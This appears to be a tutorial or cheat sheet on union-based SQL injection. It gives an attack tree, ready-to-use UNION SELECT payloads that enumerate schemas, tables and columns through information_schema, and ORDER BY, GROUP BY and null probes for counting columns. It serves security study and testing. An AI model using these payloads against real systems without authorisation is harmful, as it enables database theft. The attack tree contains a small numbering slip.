# Extracting data from the database

Union-based SQL injection is the most common of all the SQL injections. It uses the UNION statement to integrate two or 
more SELECT statements in a SQL query thereby obtaining data illegally from the database.

## Attack tree

```text
1 SQL injection to extract data from a database
    1.1 Find out if the database is vulnerable (AND)
        1.1.1 Inject data in the query without breaking it
    1.2 Find the amount of columns (AND)
    1.3 Find which columns accept queries (AND)
    1.4 Build an UNION SELECT SQL segment that will modify the WHERE clause and make it true
    1.5 Inject SQL statements into the column
    1.4 Post exploitation
```
## Example SQL segments

Database names:
```text
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
```

Tables of a database:
```text

-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
```

Column names (with for example `table_name=accounts` or `table_name=users`, depending on tables found):
```text
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

## Detect number of columns

To exploit Union Based vulnerabilities for SQLi, both queries must return the same number of columns.
There are two ways to find out the number of columns the initial request is returning.

### ORDER BY/GROUP BY

GROUP BY and ORDER BY have different functionality in SQL, but for this purpose both can be used: 
Keep incrementing the number until `False`.

```text
1' ORDER BY 1--+    # True
1' ORDER BY 2--+    # True
1' ORDER BY 3--+    # True
1' ORDER BY 4--+    # False - Query is only using 3 columns
```
```text
1' GROUP BY 1--+    # True
1' GROUP BY 2--+    # True
1' GROUP BY 3--+    # True
1' GROUP BY 4--+    # False - Query is only using 3 columns
```

    #-1' UNION SELECT 1,2,3--+    True

### UNION SELECT

Select more and more `null` values (`null` is valid in every case) until the query is correct:

```text
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

    #-1' UNION SELECT 1,2,3--+    True

## Resources

* [SQL ORDER BY clause](https://www.sqltutorial.org/sql-order-by/)
* [SQL GROUP BY clause](https://www.sqltutorial.org/sql-group-by/)
